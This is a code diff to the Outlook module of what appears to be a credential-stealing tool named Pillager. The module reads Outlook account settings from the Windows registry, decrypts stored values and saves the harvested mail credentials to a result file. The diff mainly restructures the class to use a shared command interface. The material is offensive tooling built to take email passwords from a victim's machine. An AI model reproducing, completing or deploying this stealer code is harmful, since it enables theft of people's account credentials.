@@ -4,17 +4,16 @@ using System.Security.Cryptography;
 using System.Text;
 using System.Text.RegularExpressions;
 using Microsoft.Win32;
+using Pillager.Helper;
 
 namespace Pillager.Mails
 {
-    internal class Outlook
+    internal class Outlook : ICommand
     {
-        public static string MailName = "Outlook";
+        private Regex mailClient = new Regex(@"^([a-zA-Z0-9_\-\.]+)@([a-zA-Z0-9_\-\.]+)\.([a-zA-Z]{2,5})$");
+        private Regex smptClient = new Regex(@"^(?!:\/\/)([a-zA-Z0-9-_]+\.)*[a-zA-Z0-9][a-zA-Z0-9-_]+\.[a-zA-Z]{2,11}?$");
 
-        private static Regex mailClient = new Regex(@"^([a-zA-Z0-9_\-\.]+)@([a-zA-Z0-9_\-\.]+)\.([a-zA-Z]{2,5})$");
-        private static Regex smptClient = new Regex(@"^(?!:\/\/)([a-zA-Z0-9-_]+\.)*[a-zA-Z0-9][a-zA-Z0-9-_]+\.[a-zA-Z]{2,11}?$");
-
-        public static string GrabOutlook()
+        public string GrabOutlook()
         {
             StringBuilder data = new StringBuilder();
 
@@ -43,7 +42,7 @@ namespace Pillager.Mails
             return data.ToString();
         }
 
-        private static string Get(string path, string[] clients)
+        private string Get(string path, string[] clients)
         {
             StringBuilder data = new StringBuilder();
             try
@@ -76,7 +75,7 @@ namespace Pillager.Mails
             return data.ToString();
         }
 
-        private static object GetInfoFromRegistry(string path, string valueName)
+        private object GetInfoFromRegistry(string path, string valueName)
         {
             object value = null;
             try
@@ -90,7 +89,7 @@ namespace Pillager.Mails
             return value;
         }
 
-        private static string DecryptValue(byte[] encrypted)
+        private string DecryptValue(byte[] encrypted)
         {
             try
             {
@@ -105,15 +104,15 @@ namespace Pillager.Mails
             return "null";
         }
 
-        public static void Save(string path)
+        public override void Save(string path)
         {
             try
             {
                 string result = GrabOutlook();
                 if (string.IsNullOrEmpty(result)) return;
-                string savepath = Path.Combine(path, MailName);
+                string savepath = Path.Combine(path, "Outlook");
                 Directory.CreateDirectory(savepath);
-                File.WriteAllText(Path.Combine(savepath, "result.txt"), result);
+                File.WriteAllText(Path.Combine(savepath, "result.txt"), result, Encoding.UTF8);
             }
             catch { }
         }
